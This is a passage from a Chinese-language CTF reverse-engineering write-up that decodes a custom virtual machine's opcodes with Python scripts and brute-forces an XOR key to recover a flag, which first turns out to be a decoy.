class="code"><pre><span class="line">op = [</span><br><span class="line">    <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>,</span><br><span class="line">    <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">reg = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">code = op[pos]</span><br><span class="line"><span class="keyword">while</span>(code != <span class="number">0xf4</span>):</span><br><span class="line">    code = op[pos]</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0Xf1</span>:</span><br><span class="line">        tmp = op[pos+<span class="number">1</span>]</span><br><span class="line">        x = op[pos+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0xe1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[0] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[1] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[2] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag[%d] = reg[0]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg[3] = flag[%d]&quot;</span> % x)</span><br><span class="line">        <span class="keyword">elif</span> tmp == <span class="number">0xe7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag[%d] = reg[1]&quot;</span> % x)</span><br><span class="line">        pos += <span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0] ^= reg[1]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;check_len == 21&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0] *= reg[3]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0], reg[1] = reg[1], reg[0]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> code == <span class="number">0xf6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;reg[0] = reg[2] + 2 * reg[1] + 3 * reg[0]&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pos += <span class="number">1</span></span><br></pre></td></tr></table></div></figure><p>跑出来的结果</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216161.png" alt="image-20221220114520954"></p><p>21位，每一位都异或上reg[1]，但是reg[1]并未找到输入，选择爆破</p><p>最大值不会超过128</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&quot;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    l = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        l += <span class="built_in">chr</span>((<span class="built_in">ord</span>(enc[i])^x)&amp;<span class="number">0xff</span>)</span><br><span class="line">    <span class="built_in">print</span>(l)</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216162.png" alt="image-20221220114657917"></p><p>不出意外，假flag，毕竟这个也没21位，只有20位</p><p>首先根据提示</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216163.png" alt="image-20221220114916393"></p><p>发现这个opcode其实是分两段的，以<code>0xF4</code>为结尾\</p><p>重写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">op = [</span><br><span class="line">    <span class="number">0xF5</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>,</span><br><span class="line">    <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, 